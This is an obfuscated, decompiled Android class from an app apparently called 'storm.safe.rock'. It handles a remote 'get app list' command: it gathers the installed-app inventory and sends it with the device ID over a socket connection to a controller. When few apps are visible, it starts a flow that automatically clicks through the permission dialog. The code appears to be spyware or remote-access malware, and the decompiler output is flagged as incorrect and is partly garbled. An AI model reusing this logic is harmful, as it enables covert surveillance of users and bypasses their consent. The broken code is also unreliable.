package com.storm.safe.rock.service.modules.command;

import android.os.Build;
import com.storm.safe.rock.manager.C0260a2;
import com.storm.safe.rock.service.modules.C0323a8;
import com.storm.safe.rock.util.StringUtil;
import io.socket.engineio.client.transports.PollingXHR;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import kotlin.jvm.internal.Ref$IntRef;
import kotlin.jvm.internal.Ref$ObjectRef;
import org.json.JSONArray;
import org.json.JSONObject;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.an0;
import p000.b81;
import p000.kg1;
import p000.l10;
import p000.t60;
import p000.uz0;
import p000.vk1;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.modules.command.AppCommandHandler$handleGetAppList$2", m214403f = "AppCommandHandler.kt", m214404l = {108}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class AppCommandHandler$handleGetAppList$2 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public vk1 f53416a1;

    /* renamed from: a2 */
    public Ref$ObjectRef f53417a2;

    /* renamed from: a3 */
    public Ref$IntRef f53418a3;

    /* renamed from: a4 */
    public int f53419a4;

    /* renamed from: a5 */
    public final /* synthetic */ uz0 f53420a5;

    /* renamed from: a6 */
    public final /* synthetic */ boolean f53421a6;

    /* renamed from: a7 */
    public final /* synthetic */ boolean f53422a7;

    /* renamed from: a8 */
    public final /* synthetic */ C0260a2 f53423a8;

    /* renamed from: a9 */
    public final /* synthetic */ C0323a8 f53424a9;

    /* renamed from: b0 */
    public final /* synthetic */ String f53425b0;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public AppCommandHandler$handleGetAppList$2(uz0 uz0Var, boolean z, boolean z2, C0260a2 c0260a2, C0323a8 c0323a8, String str, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f53420a5 = uz0Var;
        this.f53421a6 = z;
        this.f53422a7 = z2;
        this.f53423a8 = c0260a2;
        this.f53424a9 = c0323a8;
        this.f53425b0 = str;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new AppCommandHandler$handleGetAppList$2(this.f53420a5, this.f53421a6, this.f53422a7, this.f53423a8, this.f53424a9, this.f53425b0, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((AppCommandHandler$handleGetAppList$2) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:102:0x01f5  */
    /* JADX WARN: Removed duplicated region for block: B:46:0x010b  */
    /* JADX WARN: Removed duplicated region for block: B:47:0x010d  */
    /* JADX WARN: Removed duplicated region for block: B:50:0x0123 A[Catch: Exception -> 0x00ee, SecurityException -> 0x00f7, TRY_LEAVE, TryCatch #14 {SecurityException -> 0x00f7, Exception -> 0x00ee, blocks: (B:39:0x00cd, B:44:0x0100, B:48:0x010e, B:50:0x0123, B:22:0x007e, B:24:0x0095, B:35:0x00b8, B:34:0x00b3, B:27:0x009e, B:30:0x00a5, B:31:0x00ac), top: B:108:0x007e, inners: #8 }] */
    /* JADX WARN: Removed duplicated region for block: B:80:0x018d  */
    /* JADX WARN: Removed duplicated region for block: B:93:0x01c5  */
    /* JADX WARN: Type inference failed for: r0v23 */
    /* JADX WARN: Type inference failed for: r0v46, types: [kotlin.jvm.internal.Ref$IntRef] */
    /* JADX WARN: Type inference failed for: r0v48, types: [kotlin.jvm.internal.Ref$IntRef] */
    /* JADX WARN: Type inference failed for: r10v0, types: [java.lang.String] */
    /* JADX WARN: Type inference failed for: r10v1 */
    /* JADX WARN: Type inference failed for: r10v12 */
    /* JADX WARN: Type inference failed for: r10v13 */
    /* JADX WARN: Type inference failed for: r10v14 */
    /* JADX WARN: Type inference failed for: r10v2 */
    /* JADX WARN: Type inference failed for: r11v12 */
    /* JADX WARN: Type inference failed for: r11v3, types: [java.lang.StringBuilder] */
    /* JADX WARN: Type inference failed for: r11v4 */
    /* JADX WARN: Type inference failed for: r11v5 */
    /* JADX WARN: Type inference failed for: r11v7 */
    /* JADX WARN: Type inference failed for: r11v9 */
    /* JADX WARN: Type inference failed for: r15v5, types: [kotlin.jvm.internal.Ref$IntRef] */
    /* JADX WARN: Type inference failed for: r15v7 */
    /* JADX WARN: Type inference failed for: r15v8 */
    /* JADX WARN: Unreachable blocks removed: 2, instructions: 2 */
    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object invokeSuspend(Object obj) throws Throwable {
        String str;
        String str2;
        C0323a8 c0323a8;
        C1351vv c1351vv;
        Ref$ObjectRef ref$ObjectRef;
        C0323a8 c0323a82;
        String str3;
        int length;
        String str4;
        String str5;
        vk1 vk1Var;
        Ref$ObjectRef ref$ObjectRef2;
        ?? r0;
        ?? r15;
        C1351vv c1351vv2 = C1351vv.f60710b1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i = this.f53419a4;
        boolean z = this.f53422a7;
        boolean z2 = this.f53421a6;
        ?? r10 = "error";
        String str6 = "deviceId";
        String str7 = this.f53425b0;
        C0323a8 c0323a83 = this.f53424a9;
        uz0 uz0Var = this.f53420a5;
        try {
            if (i == 0) {
                kg1.m213544f4(obj);
                vk1 vk1Var2 = new vk1(uz0Var.f60536a0);
                ref$ObjectRef = new Ref$ObjectRef();
                c0323a82 = c0323a83;
                try {
                    ref$ObjectRef.f57626a0 = vk1Var2.m214931a1(z2, z);
                    Ref$IntRef ref$IntRef = new Ref$IntRef();
                    str3 = "error";
                    try {
                        length = ((JSONArray) ref$ObjectRef.f57626a0).length();
                        ref$IntRef.f57624a0 = length;
                        str4 = "deviceId";
                    } catch (SecurityException e) {
                        e = e;
                        str2 = "deviceId";
                        c0323a8 = c0323a82;
                        str = str3;
                        t60.m214705c6("AppCmdHandler", "获取应用列表失败（权限不足）", e);
                        if (c0323a8 != null) {
                            String strM212470a0 = StringUtil.m212470a0("KkkBBUExHzpoIy5KATVDKwk=");
                            JSONObject jSONObject = new JSONObject();
                            jSONObject.put("requestId", str7);
                            jSONObject.put(str, "权限不足，请授权应用列表权限");
                            jSONObject.put(str2, uz0Var.f60536a0.m211470g4());
                            jSONObject.put("needPermission", true);
                            c0323a8.m211658c4(strM212470a0, jSONObject);
                            c1351vv = c1351vv2;
                            return c1351vv;
                        }
                        c1351vv = null;
                        return c1351vv;
                    } catch (Exception e2) {
                        e = e2;
                        str2 = "deviceId";
                        c0323a8 = c0323a82;
                        str = str3;
                        t60.m214705c6("AppCmdHandler", "获取应用列表失败", e);
                        if (c0323a8 != null) {
                            String strM212470a02 = StringUtil.m212470a0("KkkBBUExHzpoIy5KATVDKwk=");
                            JSONObject jSONObject2 = new JSONObject();
                            jSONObject2.put("requestId", str7);
                            String message = e.getMessage();
                            if (message == null) {
                                message = "未知错误";
                            }
                            jSONObject2.put(str, message);
                            jSONObject2.put(str2, uz0Var.f60536a0.m211470g4());
                            c0323a8.m211658c4(strM212470a02, jSONObject2);
                            c1351vv = c1351vv2;
                            return c1351vv;
                        }
                        c1351vv = null;
                        return c1351vv;
                    }
                    try {
                        ?? sb = new StringBuilder("第一次获取到 ");
                        sb.append(length);
                        sb.append(" 个应用");
                        t60.m214714d6("AppCmdHandler", sb.toString());
                        int i2 = ref$IntRef.f57624a0;
                        r15 = ref$IntRef;
                        if (i2 < 2) {
                            t60.m214714d6("AppCmdHandler", "应用数量少于2个，启动自动点击权限弹窗流程");
                            C0260a2 c0260a2 = this.f53423a8;
                            sb = sb;
                            if (c0260a2 != null) {
                                try {
                                    sb = 30;
                                    sb = 30;
                                    if (Build.VERSION.SDK_INT >= 30) {
                                        new vk1(c0260a2.f52109a1);
                                    }
                                } catch (Exception e3) {
                                    t60.m214705c6("AppCmdHandler", "启动权限自动点击失败", e3);
                                    str5 = sb;
                                }
                            }
                            t60.m214714d6("AppCmdHandler", "已启动应用列表权限自动点击");
                            str5 = sb;
                            this.f53416a1 = vk1Var2;
                            this.f53417a2 = ref$ObjectRef;
                            this.f53418a3 = ref$IntRef;
                            this.f53419a4 = 1;
                            r10 = 3000;
                            if (b81.m210571b1(3000L, this) == coroutineSingletons) {
                                return coroutineSingletons;
                            }
                            vk1Var = vk1Var2;
                            ref$ObjectRef2 = ref$ObjectRef;
                            r0 = ref$IntRef;
                            str6 = str5;
                        }
                        String str8 = an0.f43729a0;
                        uz0Var.f60536a0.getSharedPreferences(an0.f43729a0, 0).edit().putBoolean("app_list_permission", r15.f57624a0 < 20).apply();
                        if (c0323a82 == null) {
                            String strM212470a03 = StringUtil.m212470a0("KkkBBUExHzpoIy5KATVDKwk=");
                            JSONObject jSONObject3 = new JSONObject();
                            jSONObject3.put("requestId", str7);
                            jSONObject3.put("apps", ref$ObjectRef.f57626a0);
                            jSONObject3.put("total", r15.f57624a0);
                            str2 = str4;
                            try {
                                jSONObject3.put(str2, uz0Var.f60536a0.m211470g4());
                                jSONObject3.put(PollingXHR.Request.EVENT_SUCCESS, r15.f57624a0 > 0);
                                if (r15.f57624a0 == 0) {
                                    str = str3;
                                    try {
                                        jSONObject3.put(str, "请点击允许授权应用列表权限后重试");
                                    } catch (SecurityException e4) {
                                        e = e4;
                                        c0323a8 = c0323a82;
                                        t60.m214705c6("AppCmdHandler", "获取应用列表失败（权限不足）", e);
                                        if (c0323a8 != null) {
                                        }
                                        c1351vv = null;
                                        return c1351vv;
                                    } catch (Exception e5) {
                                        e = e5;
                                        c0323a8 = c0323a82;
                                        t60.m214705c6("AppCmdHandler", "获取应用列表失败", e);
                                        if (c0323a8 != null) {
                                        }
                                        c1351vv = null;
                                        return c1351vv;
                                    }
                                } else {
                                    str = str3;
                                }
                                c0323a8 = c0323a82;
                            } catch (SecurityException e6) {
                                e = e6;
                                c0323a8 = c0323a82;
                                str = str3;
                                t60.m214705c6("AppCmdHandler", "获取应用列表失败（权限不足）", e);
                                if (c0323a8 != null) {
                                }
                                c1351vv = null;
                                return c1351vv;
                            } catch (Exception e7) {
                                e = e7;
                                c0323a8 = c0323a82;
                                str = str3;
                                t60.m214705c6("AppCmdHandler", "获取应用列表失败", e);
                                if (c0323a8 != null) {
                                }
                                c1351vv = null;
                                return c1351vv;
                            }
                            try {
                                c0323a8.m211658c4(strM212470a03, jSONObject3);
                            } catch (SecurityException e8) {
                                e = e8;
                                t60.m214705c6("AppCmdHandler", "获取应用列表失败（权限不足）", e);
                                if (c0323a8 != null) {
                                }
                                c1351vv = null;
                                return c1351vv;
                            } catch (Exception e9) {
                                e = e9;
                                t60.m214705c6("AppCmdHandler", "获取应用列表失败", e);
                                if (c0323a8 != null) {
                                }
                                c1351vv = null;
                                return c1351vv;
                            }
                        } else {
                            c0323a8 = c0323a82;
                            str = str3;
                            str2 = str4;
                        }
                        t60.m214714d6("AppCmdHandler", "应用列表已发送: " + r15.f57624a0 + " 个应用");
                        return new Integer(0);
                    } catch (SecurityException e10) {
                        e = e10;
                        c0323a8 = c0323a82;
                        str = str3;
                        str2 = str4;
                        t60.m214705c6("AppCmdHandler", "获取应用列表失败（权限不足）", e);
                        if (c0323a8 != null) {
                        }
                        c1351vv = null;
                        return c1351vv;
                    } catch (Exception e11) {
                        e = e11;
                        c0323a8 = c0323a82;
                        str = str3;
                        str2 = str4;
                        t60.m214705c6("AppCmdHandler", "获取应用列表失败", e);
                        if (c0323a8 != null) {
                        }
                        c1351vv = null;
                        return c1351vv;
                    }
                } catch (SecurityException e12) {
                    e = e12;
                    str = "error";
                    str2 = "deviceId";
                    c0323a8 = c0323a82;
                    t60.m214705c6("AppCmdHandler", "获取应用列表失败（权限不足）", e);
                    if (c0323a8 != null) {
                    }
                    c1351vv = null;
                    return c1351vv;
                } catch (Exception e13) {
                    e = e13;
                    str = "error";
                    str2 = "deviceId";
                    c0323a8 = c0323a82;
                    t60.m214705c6("AppCmdHandler", "获取应用列表失败", e);
                    if (c0323a8 != null) {
                    }
                    c1351vv = null;
                    return c1351vv;
                }
            }
            if (i != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            r0 = this.f53418a3;
            ref$ObjectRef2 = this.f53417a2;
            vk1Var = this.f53416a1;
            kg1.m213544f4(obj);
            str3 = "error";
            str4 = "deviceId";
            c0323a82 = c0323a83;
            r10 = r10;
            str6 = str6;
            JSONArray jSONArrayM214931a1 = vk1Var.m214931a1(z2, z);
            ref$ObjectRef2.f57626a0 = jSONArrayM214931a1;
            int length2 = jSONArrayM214931a1.length();
            r0.f57624a0 = length2;
            t60.m214714d6("AppCmdHandler", "第二次获取到 " + length2 + " 个应用");
            c0323a83 = r0;
            ref$ObjectRef = ref$ObjectRef2;
            r15 = c0323a83;
            String str82 = an0.f43729a0;
            uz0Var.f60536a0.getSharedPreferences(an0.f43729a0, 0).edit().putBoolean("app_list_permission", r15.f57624a0 < 20).apply();
            if (c0323a82 == null) {
            }
            t60.m214714d6("AppCmdHandler", "应用列表已发送: " + r15.f57624a0 + " 个应用");
            return new Integer(0);
        } catch (SecurityException e14) {
            e = e14;
            str = r10;
            str2 = str6;
            c0323a8 = c0323a83;
        } catch (Exception e15) {
            e = e15;
            str = r10;
            str2 = str6;
            c0323a8 = c0323a83;
        }
    }
}
